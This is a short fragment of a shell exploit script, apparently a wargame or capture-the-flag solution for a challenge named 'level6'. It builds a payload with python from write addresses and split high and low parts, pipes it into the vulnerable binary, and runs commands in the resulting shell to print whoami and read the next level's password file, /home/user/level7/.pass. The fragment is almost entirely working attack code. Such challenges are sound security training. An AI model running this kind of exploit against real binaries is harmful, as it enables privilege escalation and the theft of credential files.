...
GETPASS="cat /home/user/level7/.pass"
...
python -c "print('$WRITE_ADDRESSES' + '$HIGH_PART' + '$LOW_PART')" > /tmp/exploit6

(cat /tmp/exploit6 - | ~/level6) > /tmp/output6 << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI

cat /tmp/output6 | tr -s ' '